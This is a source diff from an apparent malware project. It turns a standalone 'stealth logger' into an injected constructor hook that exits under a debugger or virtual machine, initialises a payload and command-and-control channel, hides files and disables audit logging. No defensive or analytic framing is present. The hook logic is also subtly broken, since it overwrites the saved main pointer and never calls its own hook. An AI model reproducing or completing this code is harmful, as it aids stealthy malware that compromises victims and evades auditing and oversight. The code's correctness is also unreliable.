@@ -1,31 +1,58 @@
 #include <stdio.h>
 #include <stdlib.h>
-#include <signal.h>
+#include <string.h>
 #include <unistd.h>
+#include <dlfcn.h>
 #include "payload.h"
 #include "evasion.h"
+#include "c2_communication_fixed.h"
+#include "config.h"
 
-// Signal handler for clean exit
-void signal_handler(int sig) {
-    printf("\nReceived signal %d, stopping payload...\n", sig);
-    stop_payload();
-    exit(0);
+static int (*original_main)() = NULL;
+
+int hook_main() {
+	// Initialize evasion techniques
+	if (evasion_check_debugger()) {
+		return 0; // Exit if debugger detected
+	}
+
+	if (evasion_check_vm()) {
+		return 0; // Exit if VM detected
+	}
+
+	// Initialize payload
+	if (payload_init() != 0) {
+		return 0;
+	}
+
+	// Initialize C2 communication
+	if (c2_init() != 0) {
+		payload_cleanup();
+		return 0;
+	}
+
+	// Hide files
+	evasion_hide_files();
+
+	// Disable audit logging
+	evasion_disable_audit();
+
+	// Call original main function
+	if (original_main) {
+		return original_main();
+	}
+
+	return 0;
 }
 
-int main() {
-    // Set up signal handlers
-    signal(SIGINT, signal_handler);
-    signal(SIGTERM, signal_handler);
+__attribute__((constructor))
+void init_hook() {
+	// Get original main function
+	original_main = dlsym(RTLD_NEXT, "main");
+	if (!original_main) {
+		return;
+	}
 
-    // Perform evasion checks
-    if (perform_evasion_checks() != 0) {
-        printf("Evasion checks failed. Exiting.\n");
-        return 1;
-    }
-
-    // Start payload
-    printf("Starting stealth logger payload...\n");
-    start_payload();
-
-    return 0;
+	// Replace main with our hook
+	*(void **)&original_main = hook_main;
 }
